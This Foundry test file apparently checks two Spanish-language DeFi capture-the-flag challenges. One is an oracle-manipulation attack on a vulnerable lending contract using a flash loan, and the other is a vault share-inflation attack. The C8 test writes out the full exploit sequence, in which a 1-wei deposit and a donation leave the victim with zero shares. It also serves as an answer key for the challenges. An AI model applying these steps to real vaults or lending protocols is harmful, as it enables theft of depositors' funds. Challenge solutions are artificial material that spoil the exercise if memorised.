// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {TokenReto} from "../src/c7/TokenReto.sol";
import {UsdcReto} from "../src/c7/UsdcReto.sol";
import {AmmReto} from "../src/c7/AmmReto.sol";
import {PrestamistaFlash} from "../src/c7/PrestamistaFlash.sol";
import {PrestamosVulnerable} from "../src/c7/PrestamosVulnerable.sol";
import {AtacanteOraculo} from "../src/c7/AtacanteOraculo.sol";
import {AssetReto} from "../src/c8/AssetReto.sol";
import {VaultInflable} from "../src/c8/VaultInflable.sol";
import {DepositanteHonesto} from "../src/c8/DepositanteHonesto.sol";

/// Reproduce el despliegue y el estado inicial de los retos de las fichas, y
/// comprueba su condición de éxito. deployer = accounts[0], player = accounts[1].
contract PolonioFichas is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    TokenReto token; UsdcReto usdc; AmmReto amm; PrestamistaFlash lender; PrestamosVulnerable prestamos;

    function _desplegarC7() internal {
        vm.startPrank(deployer);
        // orden de despliegue 0..4
        token = new TokenReto();
        usdc = new UsdcReto();
        amm = new AmmReto(address(token), address(usdc));
        lender = new PrestamistaFlash(address(usdc));
        prestamos = new PrestamosVulnerable(address(token), address(usdc), address(amm));
        // estado inicial (desde el desplegador)
        token.mint(deployer, 100 ether);
        usdc.mint(deployer, 100_000 ether);
        token.approve(address(amm), 100 ether);
        usdc.approve(address(amm), 100_000 ether);
        amm.init(100 ether, 100_000 ether);
        usdc.mint(address(lender), 900_000 ether);
        usdc.mint(address(prestamos), 100_000 ether);
        token.mint(player, 1 ether);
        vm.stopPrank();
    }

    function test_C7_SinAtaqueNoResuelto() public {
        _desplegarC7();
        assertFalse(prestamos.isSolved());
        assertEq(prestamos.precioToken(), 1000 ether);
    }

    function test_C7_AtajosCerrados() public {
        _desplegarC7();
        vm.startPrank(player);
        vm.expectRevert(bytes("solo admin"));
        usdc.mint(player, 1);
        vm.expectRevert(bytes("solo admin"));
        amm.init(1, 1);
        // Pedir con el colateral real solo da 1.000 USDC.
        token.approve(address(prestamos), 1 ether);
        prestamos.depositar(1 ether);
        vm.expectRevert(bytes("sobre-colateralizado"));
        prestamos.pedir(100_000 ether);
        vm.stopPrank();
    }

    function test_C7_WriteupResuelve() public {
        _desplegarC7();
        vm.startPrank(player);
        AtacanteOraculo a = new AtacanteOraculo(
            address(token), address(usdc), address(amm), address(lender), address(prestamos)
        );
        token.transfer(address(a), 1 ether);
        a.atacar();
        vm.stopPrank();
        // condición de éxito: PrestamosVulnerable.isSolved() == true
        assertTrue(prestamos.isSolved());
        assertEq(usdc.balanceOf(player), 100_000 ether);
    }

    // ---------------- C8 ----------------
    AssetReto asset; VaultInflable vault; DepositanteHonesto victima;

    function _desplegarC8() internal {
        vm.startPrank(deployer);
        asset = new AssetReto();
        vault = new VaultInflable(address(asset));
        victima = new DepositanteHonesto(address(asset), address(vault));
        asset.mint(player, 2000 ether);
        asset.mint(address(victima), 500 ether);
        vm.stopPrank();
    }

    /// condición de éxito: el jugador acaba con más de 2.000 ASSET
    function _resuelto() internal view returns (bool) {
        return asset.balanceOf(player) > 2000 ether;
    }

    function test_C8_SinAtaqueNoResuelto() public {
        _desplegarC8();
        victima.depositar(); // la víctima deposita sin ataque previo
        vm.startPrank(player);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1000 ether);
        vault.redeem(vault.shares(player));
        vm.stopPrank();
        assertFalse(_resuelto(), "depositar y canjear no da beneficio");
    }

    function test_C8_AtajoMintCerrado() public {
        _desplegarC8();
        vm.prank(player);
        vm.expectRevert(bytes("solo admin"));
        asset.mint(player, 1);
    }

    function test_C8_WriteupResuelve() public {
        _desplegarC8();
        vm.startPrank(player);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);                              // 1 wei -> 1 share
        asset.transfer(address(vault), 1000 ether);    // donación
        victima.depositar();                           // la víctima recibe 0 shares
        vault.redeem(1);                               // se lleva todo
        vm.stopPrank();
        assertEq(vault.shares(address(victima)), 0);
        assertTrue(_resuelto());
        assertEq(asset.balanceOf(player), 2500 ether);
    }
}
